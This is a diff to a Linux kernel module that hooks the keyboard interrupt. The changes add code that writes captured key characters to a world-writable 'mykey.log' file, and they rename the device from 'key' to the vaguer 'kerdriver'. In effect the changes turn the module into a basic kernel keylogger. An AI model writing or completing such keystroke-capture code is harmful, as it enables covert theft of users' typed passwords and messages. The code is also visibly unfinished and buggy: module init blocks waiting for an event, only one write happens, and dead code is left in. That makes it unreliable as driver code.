@@ -17,7 +17,8 @@ struct mutex mutex;
 struct cdev *my_cdev;
 dev_t dev_num;
 struct class *my_class;
-
+char *log;
+struct file *log_file = NULL;
 
 DECLARE_COMPLETION(data_read_done);
 
@@ -83,18 +84,15 @@ static irqreturn_t keyboard_handler(int irq, void *dev)
 	pr_info("complete Event...\n");}
         return IRQ_NONE;
 }
-/* registering irq *//*
-static int test_interrupt_init(void)
+static void log_send(void)
 {
-        
+	//strcpy(log, s);
+	wait_for_completion (&data_read_done);
+        kernel_write(log_file, c, strlen(c), &log_file->f_pos);
+        /*strcpy(data, "This should be in logs again");
+        kernel_write(log_file, data, strlen(data), &log_file->f_pos);
+	*/
 }
-
-static void test_interrupt_exit(void)
-{
-        
-}
-*/
-
 
 static int my_open (struct inode *inode, struct file *file)
 {
@@ -123,7 +121,7 @@ static long (my_ioctl) (struct file *file, unsigned int cmd, unsigned long arg)
 		case DATA_RD:
 			pr_info("data_rd in c value is %c\n",c);
 			pr_info("Waiting For Event...\n");
-                	wait_for_completion (&data_read_done);
+                	
 			copy_to_user((char *)arg,&c,sizeof(char));
 			pr_info("data send to user app\n");
 			break;
@@ -154,17 +152,27 @@ struct file_operations my_fops={
 
 static int init_fun(void)
 {
-	alloc_chrdev_region(&dev_num,0,1,"key");
+	alloc_chrdev_region(&dev_num,0,1,"kerdriver");
 	my_cdev=cdev_alloc();
 	cdev_init(my_cdev,&my_fops);
 	cdev_add(my_cdev,dev_num,1);
-	my_class=class_create("class_ioctl_key");
-	device_create(my_class, NULL, dev_num,NULL,"%s", "key");
+	my_class=class_create("class_ioctl");
+	device_create(my_class, NULL, dev_num,NULL,"%s", "kerdriver");
 	mutex_init(&mutex);
 	
 	pr_info("interrupt init\n");
         request_irq(irq, keyboard_handler, IRQF_SHARED,"my_keyboard_handler", &dev);
 	
+	log_file = filp_open("mykey.log", O_WRONLY | O_CREAT, 0777);
+        if (IS_ERR(log_file)) {
+                pr_err("Error opening log file: %ld\n", PTR_ERR(log_file));
+                return PTR_ERR(log_file);
+        }
+        else
+        {
+        	pr_info("file open\n");
+        	}
+        log_send();
 	
 	pr_info("init fun called\n");
 	
@@ -184,6 +192,9 @@ static void exit_fun(void)
 	class_destroy(my_class);
 	cdev_del(my_cdev);
 	unregister_chrdev_region(dev_num, 1);
+	
+	filp_close(log_file,NULL);
+	
 	pr_info("exit fun called\n");
 }
 module_init(init_fun);
